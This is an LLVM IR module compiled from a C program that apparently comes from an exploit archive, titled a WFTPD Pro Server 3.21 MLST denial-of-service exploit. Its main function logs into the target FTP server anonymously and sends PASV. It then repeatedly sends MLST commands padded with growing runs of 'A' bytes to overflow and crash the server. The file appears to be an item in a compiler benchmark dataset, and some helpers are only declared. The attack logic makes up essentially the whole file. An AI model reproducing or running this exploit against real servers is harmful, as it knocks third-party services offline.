; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_427.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_427.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.user = private unnamed_addr constant [32 x i8] c"anonymous\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 16
@__const.main.pass = private unnamed_addr constant [32 x i8] c"anonymous\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 16
@.str = private unnamed_addr constant [6 x i8] c"MLST \00", align 1
@OVERFLOWSIZE = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [41 x i8] c"WFTPD Pro Server 3.21 MLST DoS Exploit\0D\0A\00", align 1
@.str.2 = private unnamed_addr constant [51 x i8] c"lion lion#cnhonker.net, http://www.cnhonker.com\0D\0A\0A\00", align 1
@.str.3 = private unnamed_addr constant [31 x i8] c"%s <TargetHost> <TargetPort>\0D\0A\00", align 1
@.str.4 = private unnamed_addr constant [35 x i8] c"[-] ERROR: Create socket failed.\0D\0A\00", align 1
@sendbuf = common dso_local global i8* null, align 8
@BUFFSIZE = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [7 x i8] c"pasv\0D\0A\00", align 1
@.str.6 = private unnamed_addr constant [10 x i8] c"Send pasv\00", align 1
@.str.7 = private unnamed_addr constant [5 x i8] c"read\00", align 1
@recvbuf = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [20 x i8] c"buff size :%d\0D\0A%s\0D\0A\00", align 1
@show = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [19 x i8] c"Send overflow buff\00", align 1
@.str.10 = private unnamed_addr constant [5 x i8] c"%s\0D\0A\00", align 1
@.str.11 = private unnamed_addr constant [5 x i8] c"QUIT\00", align 1
@.str.12 = private unnamed_addr constant [10 x i8] c"Send QUIT\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i16, align 2
  %7 = alloca i64, align 8
  %8 = alloca [32 x i8], align 16
  %9 = alloca [32 x i8], align 16
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i64, align 8
  %13 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %14 = bitcast [32 x i8]* %8 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %14, i8* align 16 getelementptr inbounds ([32 x i8], [32 x i8]* @__const.main.user, i32 0, i32 0), i64 32, i1 false)
  %15 = bitcast [32 x i8]* %9 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %15, i8* align 16 getelementptr inbounds ([32 x i8], [32 x i8]* @__const.main.pass, i32 0, i32 0), i64 32, i1 false)
  store i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i64 0, i64 0), i8** %11, align 8
  %16 = load i32, i32* @OVERFLOWSIZE, align 4
  store i32 %16, i32* %13, align 4
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.1, i64 0, i64 0))
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.2, i64 0, i64 0))
  %19 = load i32, i32* %3, align 4
  %20 = icmp slt i32 %19, 3
  br i1 %20, label %21, label %26

21:                                               ; preds = %2
  %22 = load i8**, i8*** %4, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 0
  %24 = load i8*, i8** %23, align 8
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.3, i64 0, i64 0), i8* %24)
  br label %124

26:                                               ; preds = %2
  %27 = call i32 @MAKEWORD(i32 2, i32 2)
  %28 = call i32 @WSAStartup(i32 %27, i32* %5)
  %29 = call i64 (...) @create_socket()
  store i64 %29, i64* %12, align 8
  %30 = icmp eq i64 %29, 0
  br i1 %30, label %31, label %33

31:                                               ; preds = %26
  %32 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.4, i64 0, i64 0))
  br label %124

33:                                               ; preds = %26
  %34 = load i64, i64* %12, align 8
  %35 = load i8**, i8*** %4, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 1
  %37 = load i8*, i8** %36, align 8
  %38 = load i8**, i8*** %4, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 2
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 @atoi(i8* %40)
  %42 = call i32 @client_connect(i64 %34, i8* %37, i32 %41)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %46, label %44

44:                                               ; preds = %33
  %45 = call i32 @exit(i32 -1) #4
  unreachable

46:                                               ; preds = %33
  %47 = load i64, i64* %12, align 8
  %48 = getelementptr inbounds [32 x i8], [32 x i8]* %8, i64 0, i64 0
  %49 = getelementptr inbounds [32 x i8], [32 x i8]* %9, i64 0, i64 0
  %50 = call i32 @loginftp(i64 %47, i8* %48, i8* %49)
  %51 = load i8*, i8** @sendbuf, align 8
  %52 = load i32, i32* @BUFFSIZE, align 4
  %53 = call i32 @memset(i8* %51, i8 signext 0, i32 %52)
  %54 = load i8*, i8** @sendbuf, align 8
  %55 = call i32 @memcpy(i8* %54, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i64 0, i64 0), i32 6)
  %56 = load i64, i64* %12, align 8
  %57 = load i8*, i8** @sendbuf, align 8
  %58 = call i32 @writebuf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.6, i64 0, i64 0), i64 %56, i8* %57, i32 6)
  %59 = load i64, i64* %12, align 8
  %60 = load i32, i32* @recvbuf, align 4
  %61 = load i32, i32* @BUFFSIZE, align 4
  %62 = call i32 @readbuf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.7, i64 0, i64 0), i64 %59, i32 %60, i32 %61)
  store i32 0, i32* %10, align 4
  br label %63

63:                                               ; preds = %101, %46
  %64 = load i32, i32* %10, align 4
  %65 = icmp slt i32 %64, 60
  br i1 %65, label %66, label %106

66:                                               ; preds = %63
  %67 = load i8*, i8** @sendbuf, align 8
  %68 = load i32, i32* @BUFFSIZE, align 4
  %69 = call i32 @memset(i8* %67, i8 signext 0, i32 %68)
  %70 = load i8*, i8** @sendbuf, align 8
  %71 = load i32, i32* %13, align 4
  %72 = call i32 @memset(i8* %70, i8 signext 65, i32 %71)
  %73 = load i8*, i8** @sendbuf, align 8
  %74 = load i8*, i8** %11, align 8
  %75 = load i8*, i8** %11, align 8
  %76 = call i32 @strlen(i8* %75)
  %77 = call i32 @memcpy(i8* %73, i8* %74, i32 %76)
  %78 = load i8*, i8** @sendbuf, align 8
  %79 = load i32, i32* %13, align 4
  %80 = sub nsw i32 %79, 2
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds i8, i8* %78, i64 %81
  store i8 13, i8* %82, align 1
  %83 = load i8*, i8** @sendbuf, align 8
  %84 = load i32, i32* %13, align 4
  %85 = sub nsw i32 %84, 1
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds i8, i8* %83, i64 %86
  store i8 10, i8* %87, align 1
  %88 = load i8*, i8** @sendbuf, align 8
  %89 = call i32 @strlen(i8* %88)
  %90 = load i8*, i8** @sendbuf, align 8
  %91 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.8, i64 0, i64 0), i32 %89, i8* %90)
  store i32 1, i32* @show, align 4
  %92 = load i64, i64* %12, align 8
  %93 = load i8*, i8** @sendbuf, align 8
  %94 = load i32, i32* %13, align 4
  %95 = call i32 @writebuf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.9, i64 0, i64 0), i64 %92, i8* %93, i32 %94)
  %96 = load i64, i64* %12, align 8
  %97 = load i32, i32* @recvbuf, align 4
  %98 = load i32, i32* @BUFFSIZE, align 4
  %99 = call i32 @readbuf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.7, i64 0, i64 0), i64 %96, i32 %97, i32 %98)
  %100 = call i32 @Sleep(i32 500)
  br label %101

101:                                              ; preds = %66
  %102 = load i32, i32* %10, align 4
  %103 = add nsw i32 %102, 1
  store i32 %103, i32* %10, align 4
  %104 = load i32, i32* %13, align 4
  %105 = add nsw i32 %104, 1
  store i32 %105, i32* %13, align 4
  br label %63

106:                                              ; preds = %63
  %107 = load i8*, i8** @sendbuf, align 8
  %108 = load i32, i32* @BUFFSIZE, align 4
  %109 = call i32 @memset(i8* %107, i8 signext 0, i32 %108)
  %110 = load i8*, i8** @sendbuf, align 8
  %111 = call i32 @sprintf(i8* %110, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i64 0, i64 0))
  %112 = load i64, i64* %12, align 8
  %113 = load i8*, i8** @sendbuf, align 8
  %114 = load i8*, i8** @sendbuf, align 8
  %115 = call i32 @strlen(i8* %114)
  %116 = call i32 @writebuf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.12, i64 0, i64 0), i64 %112, i8* %113, i32 %115)
  %117 = load i64, i64* %12, align 8
  %118 = icmp ne i64 %117, 0
  br i1 %118, label %119, label %122

119:                                              ; preds = %106
  %120 = load i64, i64* %12, align 8
  %121 = call i32 @closesocket(i64 %120)
  br label %122

122:                                              ; preds = %119, %106
  %123 = call i32 (...) @WSACleanup()
  br label %124

124:                                              ; preds = %122, %31, %21
  ret void
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @WSAStartup(i32, i32*) #2

declare dso_local i32 @MAKEWORD(i32, i32) #2

declare dso_local i64 @create_socket(...) #2

declare dso_local i32 @client_connect(i64, i8*, i32) #2

declare dso_local i32 @atoi(i8*) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @loginftp(i64, i8*, i8*) #2

declare dso_local i32 @memset(i8*, i8 signext, i32) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @writebuf(i8*, i64, i8*, i32) #2

declare dso_local i32 @readbuf(i8*, i64, i32, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @Sleep(i32) #2

declare dso_local i32 @sprintf(i8*, i8*, i8*) #2

declare dso_local i32 @closesocket(i64) #2

declare dso_local i32 @WSACleanup(...) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
